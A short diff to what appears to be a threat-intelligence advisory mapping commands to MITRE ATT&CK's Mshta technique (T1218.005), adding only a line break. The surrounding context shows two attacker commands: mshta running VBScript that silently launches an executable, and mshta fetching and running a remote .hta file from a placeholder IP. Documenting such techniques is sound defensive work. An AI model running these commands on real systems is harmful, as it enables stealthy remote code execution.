@@ -555,3 +555,5 @@ System Binary Proxy Execution: Mshta [[T1218.005](https://attack.mitre.org/techn
 mshta.exe vbscript:(CreateObject("WScript.Shell").Run("<file_name>.exe",0)) (Window.Close)
 mshta.exe http[:]//<IP_address>/<file_name>.hta
 ```
+<br>
+
